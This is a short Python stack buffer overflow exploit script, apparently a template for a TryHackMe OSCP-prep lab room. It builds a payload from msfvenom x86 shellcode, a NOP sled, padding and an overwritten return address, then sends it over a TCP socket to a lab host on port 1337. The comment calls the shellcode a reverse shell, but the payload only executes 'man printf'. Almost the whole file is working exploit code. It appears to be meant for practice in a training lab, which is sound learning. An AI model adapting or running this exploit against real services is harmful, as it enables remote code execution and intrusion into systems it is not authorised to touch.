import socket
import sys

#
# opinfosec
# BoF Template for Overflow1 for TryHackMe oscp.exe
# https://github.com/opsec-infosec/BufferOverflow
#

# Bad Chars 0x00

# Reverse Shell
# msfvenom  -a x86 --platform linux -p linux/x86/exec  CMD="man printf" -b '\x00\x0a\x0d' -f c -v payload_shell

payload_cmd = (
"\xb8\x16\xa7\x19\xc6\xdd\xc5\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x0c\x83\xc7\x04\x31\x47\x10\x03\x47\x10\xf4\x52\x73"
"\xcd\xa0\x05\xd6\xb7\x38\x1b\xb4\xbe\x5f\x0b\x15\xb2\xf7"
"\xcc\x01\x1b\x65\xa4\xbf\xea\x8a\x64\xa8\xe6\x4c\x89\x28"
"\x94\x2d\xe7\x08\x16\xdf\x9e\x26\xa2\x79\x61\xe0\x19\x0c"
"\x80\xc3\x1e"
)


nop_sled = "\x90" * 16  # NOP Sled
filler = "A" * (1036 - ((len(nop_sled)) + len(payload_cmd))) # Filler 1036 Bytes - nop sled Bytes - payload_shell
eip = "\x6f\x9b\x04\x08"    #0x08049b6f  Return Address JMP EAX

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.16.110.135", 1337))
    buffer = nop_sled + payload_cmd + filler + eip
    s.send(buffer.encode("latin-1"))
    s.close()

except Exception as ex:
    print ("Error: ", ex)
    sys.exit(1)

sys.exit(0)
